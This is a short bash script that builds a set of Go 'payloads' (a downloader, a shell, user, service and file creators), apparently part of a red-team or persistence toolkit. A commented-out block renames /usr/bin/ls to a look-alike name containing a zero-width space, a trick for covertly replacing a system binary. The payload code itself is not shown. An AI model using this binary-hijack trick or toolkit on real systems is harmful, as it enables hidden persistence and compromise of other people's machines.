#!/bin/bash

#Build payloads
cd downloader
go build downloader.go
echo "Built downloader"
cd ../file-creator
go build file-creator.go
echo "Built file-creator"
cd ../random-messenger
go build random-messenger.go
echo "Built random-messenger"
cd ../shell
go build shell.go
echo "Built shell"
cd ../user-creator
go build user-creator.go
echo "Built user-creator"
cd ..
go build service-creator.go
echo "Built service-creator"

echo "Built all go files"

# if [ $# -eq 0 ]; then
#     echo "No arguments supplied; assuming first time"
# 	mv "/usr/bin/ls" "/usr/bin/ls​" #THERE IS A ZERO WIDTH SPACE HERE
# else
# 	if [ $1 != "--reinstall" ]; then
# 		mv "/usr/bin/ls" "/usr/bin/ls​" #THERE IS A ZERO WIDTH SPACE HERE
# 	fi
# fi

echo $@